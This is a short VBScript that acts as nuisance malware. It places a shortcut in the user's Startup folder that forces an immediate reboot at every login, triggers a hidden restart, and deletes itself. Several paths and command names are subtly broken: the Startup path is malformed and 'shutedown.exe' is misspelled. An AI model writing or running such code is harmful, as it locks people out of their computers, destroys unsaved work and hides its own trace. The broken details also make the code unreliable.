Dim fs
Dim fn
Dim wn

Set wn = CreateObject("WScript.Network")
Set fs = WScript.CreateObject("WScript.Shell")
Set fn = fs.CreateShortcut("C:¥Users¥" & wn.UserName & "AppData¥Roaming¥Microsoft¥Windows¥StartMenu¥Programs¥Startup¥shutdown.lnk")
fn.TargetPath = "C:¥Windows¥System32¥shutdown.exe"
fn.Arguments = "/r /f /t 0"
fn.save

Set ws = CreateObject("WScript.Shell")
ws.Run "shutedown.exe -r -f -t 10",0

Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile(Wscript.ScriptFullName)
